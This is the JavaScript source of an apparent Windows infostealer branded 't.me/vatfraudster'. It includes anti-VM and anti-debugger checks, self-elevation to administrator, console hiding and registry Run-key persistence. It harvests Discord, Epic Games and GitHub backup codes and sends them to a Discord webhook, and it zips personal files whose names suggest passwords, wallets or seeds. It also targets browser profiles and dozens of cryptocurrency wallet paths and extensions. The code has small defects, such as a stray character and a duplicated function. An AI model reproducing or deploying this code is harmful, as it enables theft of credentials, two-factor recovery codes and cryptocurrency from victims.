const fs = require('fs');
const fsPromises = fs.promises;
const path = require('path');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { spawn, execFileSync, execSync, exec } = require('child_process');
const { promisify } = require('util');
const execPromise = promisify(exec);
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const util = require('util');
const { Dpapi } = require("@primno/dpapi");
const forge = require("node-forge");
const seco = require("seco-file");
const WebSocket = require("ws");
const http = require('http');
const puppeteer = require('puppeteer');

function getLocale() {
    return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
}

const computerName = os.hostname();
const local = process.env.LOCALAPPDATA;
const discords = [];
const locale = getLocale();

// win + r + %temp%
const mainFolderPath = path.join(os.tmpdir(), generateRandomString(12), `${locale}-${computerName}`);

// old path (reqQUIRED steam to get logz)
// const mainFolderPath = `C:/ProgramData/Steam/Launcher/${generateRandomString(12)}/${locale}-${computerName}`;

const RANDOMM = generateRandomString(8);
let allPasswords = [];
const cookiesBrowserUsed = new Set();

var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];

const atomicInjectionUrl = "https://github.com/soon...";
const exodusInjectionUrl = "https://github.com/soon...";

const url = 'BINDER-LINK-HERE';
const botToken = 'YOURBOTTOKEN';
const chatId = 'YOURCHATID';
const discordWebhookUrl = 'REMPLACE_ME';

const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];


function hasAdminPrivileges() {
    const testFilePath = path.join(process.env.WINDIR, 'System32', `${generateRandomString(10)}.txt`);
    try {
        fs.writeFileSync(testFilePath, 'test');
        fs.unlinkSync(testFilePath);
        return true;
    } catch (err) {
        return false;
    }
}

function relaunchAsAdmin() {
    const scriptPath = process.execPath;
    const scriptArgs = process.argv.slice(1).join(' ');
    const command = `powershell -Command "Start-Process '${scriptPath}' -ArgumentList '${scriptArgs}' -Verb RunAs"`;
    execSync(command, { stdio: 'inherit' });
    process.exit(0);
}

async function main() {
    if (!hasAdminPrivileges()) {
        console.log("The script does not have administrative privileges.");
        relaunchAsAdmin();
    } else {
        console.log("");
    }
}

function executeCommand(command, callback) {
    exec(command, (error, stdout, stderr) => {
        if (error) return;
        if (stderr) return;
        callback(stdout.trim());
    });
}

function checkListed(list, value) {
    return list.some(item => value.includes(item));
}

function usernameCheck(callback) {
    const userName = process.env['USERPROFILE'].split(path.sep)[2];
    if (checkListed(blackListedUsername, userName)) {
        exitProcess();
    } else {
        hostnameCheck(callback);
    }
}

function hostnameCheck(callback) {
    const hostName = os.hostname();
    if (checkListed(blackListedHostname, hostName)) {
        exitProcess();
    } else {
        motherboardCheck(callback);
    }
}

function motherboardCheck(callback) {
    executeCommand('wmic baseboard get serialnumber', (stdout) => {
        const motherboardSerial = stdout.trim().split('\n')[1].trim();
        if (motherboardSerial.startsWith("Board-GoogleCloud")) {
            exitProcess();
        } else {
            biosCheck(callback);
        }
    });
}

function biosCheck(callback) {
    executeCommand('wmic bios get smbiosbiosversion', (stdout) => {
        if (stdout.includes("Hyper-V")) {
            exitProcess();
        } else {
            speedCheck(callback);
        }
    });
}

function speedCheck(callback) {
    executeCommand('wmic MemoryChip get /format:list | find /i "Speed"', (stdout) => {
        if (stdout.includes("Speed=0")) {
            exitProcess();
        } else {
            gpuCheck(callback);
        }
    });
}

function gpuCheck(callback) {
    executeCommand('wmic path win32_VideoController get name', (stdout) => {
        const gpuList = stdout.split(",").map(gpu => gpu.trim());
        if (checkListed(blackListedGPU, gpuList)) {
            exitProcess();
        } else {
            if (gpuList.some(gpu => gpu.startsWith("VMware"))) {
                exitProcess();
            } else {
                osCheck(callback);
            }
        }
    });
}

function osCheck(callback) {
    executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
        const osp = stdout.trim();
        if (checkListed(blacklistedOS, osp)) {
            exitProcess();
        } else {
            processCheck(callback);
        }
    });
}

function processCheck(callback) {
    executeCommand('tasklist /fo csv', (stdout) => {
        const processes = stdout.split('\r\n').map(line => {
            const cols = line.split('","');
            return cols[0].replace('"', '');
        });
        for (const processName of blackListedProcesses) {
            if (processes.includes(processName)) {
                exitProcess();
                return;
            }
        }
        callback();
    });
}

function getPCSerialNumber(callback) {
    exec('wmic diskdrive get serialnumber', (error, stdout, stderr) => {
        if (error) return;
        if (stderr) return;
        callback(stdout);
    });
}

function exitProcess() {
    execSync("powershell wininit.exe");
    process.exit(0);
}

function antivm() {
    getPCSerialNumber((serialNumber) => {
        const disks = serialNumber.split('\n');
        for (const disk of disks) {
            if (disk.trim().startsWith("vb") || disk.trim().startsWith("vm")) {
                exitProcess();
                return;
            }
        }
        usernameCheck(() => {
            console.log("All checks passed successfully.");
        });
    });
}

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        result += chars[randomIndex];
    }
    return result;
}

function hideconsole() {
    const randomFileName = `${generateRandomString(10)}.ps1`;
    const powershellScript = `
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
    `;

    const tempDir = os.tmpdir();
    const tempfile = path.join(tempDir, randomFileName);
    fs.writeFileSync(tempfile, powershellScript);
    try {
        execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: 'inherit' });
    } finally {
        fs.unlinkSync(tempfile);
    }
}


const foldersToSearch = [
  'Videos', 'Desktop', 'Documents', 'Downloads', 'Pictures',
  path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
];

paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function startup() {
  const exeFilePath = process.execPath;
  const vbsFileName = 'Update.vbs';
  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName);
  const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
  const keyName = path.basename(exeFilePath, '.exe');
  const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;
  fs.writeFileSync(programDataPath, vbsContent);
  const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;
  exec(addCommand, (error, stdout, stderr) => {
    if (error) return;
    if (stderr) return;
  });
}

function sendSuccessToWebhook() {i
  console.log('Sending success to webhook');
}

async function findBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);
      for (const currentFile of files) {
        if (currentFile === 'discord_backup_codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);
          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Discord backup codes found",
                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | t.me/vatfraudster`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = { embeds: [embed] };
            try {
              await axios.post(discordWebhookUrl, payload);
            } catch (error) { }
          } catch (error) { }
        }
      }
    } catch (err) { }
  }
}

async function findEpicGamesBackupCodes() {
  const epicGamesBackupFileName = 'Epic Games Account Two-Factor backup codes.txt';
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);
      for (const currentFile of files) {
        if (currentFile === epicGamesBackupFileName) {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);
          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Epic Games Backup codes found",
                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1206880939624370277/epic-games-icon-2048x2048-tyfxpnys.png?ex=65dd9e76&is=65cb2976&hm=0fbcc1c2929db9fa85e2e0a9844a74b22bf59c063b3fc8ed55b9bca6c6484c74&"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | t.me/vatfraudster`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = { embeds: [embed] };

            try {
              await axios.post(discordWebhookUrl, payload);
              console.log('Epic Games Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}


async function findGithubBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);
      for (const currentFile of files) {
        if (currentFile === 'github-recovery-codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);
          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Github backup codes found",
                icon_url: "https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | t.me/vatfraudster`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = { embeds: [embed] };
            try {
              await axios.post(discordWebhookUrl, payload);
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}

const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];

function stealFiles() {
  try {
    const tempDir = fs.mkdtempSync(path.join(process.env.TEMP || '/tmp', crypto.randomBytes(16).toString('hex')));
    const zip = new AdmZip();
    for (const extension of allowedExtensions) {
      const results = [];
      for (const folder of foldersToSearch) {
        const directory = path.join(process.env.HOME || process.env.USERPROFILE, folder);
        if (fs.existsSync(directory)) {
          const filesInFolder = fs.readdirSync(directory);
          for (const file of filesInFolder) {
            const filePath = path.join(directory, file);
            const fileExtension = path.extname(file).toLowerCase();
            const fileName = path.basename(file, path.extname(file)).toLowerCase();
            const fileStats = fs.statSync(filePath);
            const fileSize = fileStats.size;
            if (fileStats.isFile() &&
                fileExtension === extension &&
                files.some(keyword => fileName.includes(keyword)) &&
                fileSize < 3 * 1024 * 1024) {
              results.push(filePath);
            }
          }
        }
      }

      if (results.length > 0) {
        results.forEach(file => {
          const fileName = path.basename(file);
          const destPath = path.join(tempDir, fileName);
          fs.copyFileSync(file, destPath);
        });
      }
    }

    zip.addLocalFolder(tempDir);
    const zipFilePath = path.join(mainFolderPath, 'stolen_files.zip');
    zip.writeZip(zipFilePath);
    fs.rmSync(tempDir, { recursive: true });
    console.log('Files stolen and compressed successfully.');
  } catch (err) {
    console.error("Error:", err);
  }
}


function sendSuccessToWebhook() {
    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
    axios.post(discordWebhookUrl, {
        content: successMessage,
    }).then(response => {
        console.log('Success message sent to Discord webhook successfully.');
    }).catch(error => {
        console.error('Failed to send success message to Discord webhook:', error.message);
    });
}

function moveFileToFolder(filePath, folderName) {
    const destinationFolder = path.join(mainFolderPath, folderName);
    const destinationPath = path.join(destinationFolder, path.basename(filePath));
    if (!fs.existsSync(destinationFolder)) fs.mkdirSync(destinationFolder);
    fs.renameSync(filePath, destinationPath);
}

const walletLocalPaths = {
    "Bitcoin": path.join(process.env.APPDATA, "Bitcoin", "wallets"),
    "Zcash": path.join(process.env.APPDATA, "Zcash"),
    "Armory": path.join(process.env.APPDATA, "Armory"),
    "Bytecoin": path.join(process.env.APPDATA, "bytecoin"),
    "Jaxx": path.join(process.env.APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
    "Exodus": path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),
    "Ethereum": path.join(process.env.APPDATA, "Ethereum", "keystore"),
    "Electrum": path.join(process.env.APPDATA, "Electrum", "wallets"),
    "AtomicWallet": path.join(process.env.APPDATA, "atomic", "Local Storage", "leveldb"),
    "Guarda": path.join(process.env.APPDATA, "Guarda", "Local Storage", "leveldb"),
    "Coinomi": path.join(process.env.APPDATA, "Coinomi", "Coinomi", "wallets"),
};


const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
const count = _0x9b6227,


user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================<[ t.me/vatfraudster ]>================>\n\n',
    url: null,
    locale: locale,
}

_0x2afdce = {}

// these wallets are outdated or no longer used !!
// Ronin, GuardaWallet, JaxxxLiberty, Wombat, EVERWallet, KardiaChain, XDEFI, Nami, TerraStation, MartianAptos, TON, SuietSui, FewchaMove, 
// EthosSui, NiftyWallet, BraveWallet, EqualWallet, BitAppWallet, iWallet, MewCx, GuildWallet, SaturnWallet, HarmonyWallet, PaliWallet, 
// BoltX, LiqualityWallet, MaiarDeFiWallet

const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Metamask = '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.Coinbase = '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad'
_0x4ae424.BinanceChain = '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom = '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink = '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus = '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 = '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator = '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet = '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet = '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet = '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty = '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat = '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet = '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain = '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation = '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos = '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom = '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos = '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet = '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender = '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui = '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos = '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove = '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui = '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX = '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet = '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet = '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet = '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
